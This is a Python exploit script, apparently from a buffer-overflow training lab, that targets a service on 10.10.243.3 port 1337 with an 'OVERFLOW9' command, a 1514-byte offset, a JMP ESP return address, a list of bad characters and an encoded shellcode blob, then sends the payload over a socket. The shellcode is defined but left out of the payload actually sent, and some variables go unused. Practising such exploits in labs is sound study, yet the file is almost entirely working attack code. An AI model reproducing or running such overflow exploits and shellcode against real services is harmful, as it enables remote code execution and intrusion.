import socket, struct


host, port = '10.10.243.3', 1337

command = b'OVERFLOW9 '
offset = 1514
length = 2000
new_eip = b'BBBB'
bad_chars = [
b'\x04',
b'\x3e',
b'\x3f',
b'\xe1'
]
shellcode =  b""
shellcode += b"\xda\xda\xd9\x74\x24\xf4\xba\x8d\x14\x3b\x0f"
shellcode += b"\x5f\x31\xc9\xb1\x52\x31\x57\x17\x83\xef\xfc"
shellcode += b"\x03\xda\x07\xd9\xfa\x18\xcf\x9f\x05\xe0\x10"
shellcode += b"\xc0\x8c\x05\x21\xc0\xeb\x4e\x12\xf0\x78\x02"
shellcode += b"\x9f\x7b\x2c\xb6\x14\x09\xf9\xb9\x9d\xa4\xdf"
shellcode += b"\xf4\x1e\x94\x1c\x97\x9c\xe7\x70\x77\x9c\x27"
shellcode += b"\x85\x76\xd9\x5a\x64\x2a\xb2\x11\xdb\xda\xb7"
shellcode += b"\x6c\xe0\x51\x8b\x61\x60\x86\x5c\x83\x41\x19"
shellcode += b"\xd6\xda\x41\x98\x3b\x57\xc8\x82\x58\x52\x82"
shellcode += b"\x39\xaa\x28\x15\xeb\xe2\xd1\xba\xd2\xca\x23"
shellcode += b"\xc2\x13\xec\xdb\xb1\x6d\x0e\x61\xc2\xaa\x6c"
shellcode += b"\xbd\x47\x28\xd6\x36\xff\x94\xe6\x9b\x66\x5f"
shellcode += b"\xe4\x50\xec\x07\xe9\x67\x21\x3c\x15\xe3\xc4"
shellcode += b"\x92\x9f\xb7\xe2\x36\xfb\x6c\x8a\x6f\xa1\xc3"
shellcode += b"\xb3\x6f\x0a\xbb\x11\xe4\xa7\xa8\x2b\xa7\xaf"
shellcode += b"\x1d\x06\x57\x30\x0a\x11\x24\x02\x95\x89\xa2"
shellcode += b"\x2e\x5e\x14\x35\x50\x75\xe0\xa9\xaf\x76\x11"
shellcode += b"\xe0\x6b\x22\x41\x9a\x5a\x4b\x0a\x5a\x62\x9e"
shellcode += b"\x9d\x0a\xcc\x71\x5e\xfa\xac\x21\x36\x10\x23"
shellcode += b"\x1d\x26\x1b\xe9\x36\xcd\xe6\x7a\x33\x19\xdd"
shellcode += b"\x42\x2b\x1f\x1d\x90\x82\x96\xfb\xbc\xc4\xfe"
shellcode += b"\x54\x29\x7c\x5b\x2e\xc8\x81\x71\x4b\xca\x0a"
shellcode += b"\x76\xac\x85\xfa\xf3\xbe\x72\x0b\x4e\x9c\xd5"
shellcode += b"\x14\x64\x88\xba\x87\xe3\x48\xb4\xbb\xbb\x1f"
shellcode += b"\x91\x0a\xb2\xf5\x0f\x34\x6c\xeb\xcd\xa0\x57"
shellcode += b"\xaf\x09\x11\x59\x2e\xdf\x2d\x7d\x20\x19\xad"
shellcode += b"\x39\x14\xf5\xf8\x97\xc2\xb3\x52\x56\xbc\x6d"
shellcode += b"\x08\x30\x28\xeb\x62\x83\x2e\xf4\xae\x75\xce"
shellcode += b"\x45\x07\xc0\xf1\x6a\xcf\xc4\x8a\x96\x6f\x2a"
shellcode += b"\x41\x13\x9f\x61\xcb\x32\x08\x2c\x9e\x06\x55"
shellcode += b"\xcf\x75\x44\x60\x4c\x7f\x35\x97\x4c\x0a\x30"
shellcode += b"\xd3\xca\xe7\x48\x4c\xbf\x07\xfe\x6d\xea"

def p32(data):
        return struct.pack("<I",data)

jmp_esp = p32(0x625011EB)
all_chars = bytearray(range(1,256))
for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')
nop_sled = b'\x90'
payload = b''.join([
command,
b'A'*offset,
jmp_esp,
nop_sled,
b'C' * (length - offset - len(jmp_esp) - len(nop_sled)),
])


with socket.socket() as s:
        s.connect((host,port))
        s.send(payload)
